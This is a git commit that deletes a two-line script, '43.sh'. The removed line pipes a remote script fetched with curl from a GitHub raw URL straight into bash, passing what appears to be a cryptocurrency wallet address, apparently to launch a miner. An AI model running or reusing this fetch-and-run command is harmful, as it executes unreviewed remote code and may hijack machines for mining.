428e5383f24fe617b084cde2c24d2faa91250de8
you fuck me <151545720+mumu1667@users.noreply.github.com>
2023-12-05 00:50:56 +0700

    Delete 43.sh

--- 43.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-curl -s https://raw.githubusercontent.com/mumu1667/trx20/main/bhb.sh | LC_ALL=en_US.UTF-8 bash -s 43LnXHx4St2VXP3EgCpH4UDu5LbsajdmLQHboSkdcEhFMcbiHxgVEstjHYjsVEZc7BMVqMoZRB1d79E3LQYuAqBWFPPvSdz
